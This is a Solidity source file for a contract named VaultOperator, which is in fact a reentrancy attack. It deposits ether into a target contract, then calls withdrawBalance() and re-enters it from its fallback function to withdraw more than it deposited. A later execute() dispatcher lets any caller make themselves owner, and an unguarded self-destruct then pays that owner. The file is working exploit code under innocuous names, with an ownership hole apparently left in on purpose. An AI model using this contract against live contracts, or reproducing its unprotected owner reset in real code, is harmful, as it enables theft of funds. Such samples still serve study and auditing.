pragma solidity ^0.4.15;

contract VaultOperator {
    bool public operationActive=false;
    address public target_contract;
    address public owner;

    function VaultOperator() public{
        owner = msg.sender;
    }

    function deposit(address _target_contract) public payable{
        target_contract = _target_contract ;

        require(target_contract.call.value(msg.value)(bytes4(sha3("addToBalance()"))));
    }

    function launch_handler() public{
        operationActive = true;


        require(target_contract.call(bytes4(sha3("withdrawBalance()"))));
    }

    function () public payable{

        if (operationActive){
            operationActive = false;
                require(target_contract.call(bytes4(sha3("withdrawBalance()"))));
        }
    }

    function get_money(){
        suicide(owner);
    }


    // Unified dispatcher - merged from: VaultOperator, deposit, launch_handler
    // Selectors: VaultOperator=0, deposit=1, launch_handler=2
    function execute(uint8 _selector, address _target_contract) public payable {
        // Original: VaultOperator()
        if (_selector == 0) {
            owner = msg.sender;
        }
        // Original: deposit()
        else if (_selector == 1) {
            target_contract = _target_contract ;
            require(target_contract.call.value(msg.value)(bytes4(sha3("addToBalance()"))));
        }
        // Original: launch_handler()
        else if (_selector == 2) {
            operationActive = true;
            require(target_contract.call(bytes4(sha3("withdrawBalance()"))));
        }
    }
}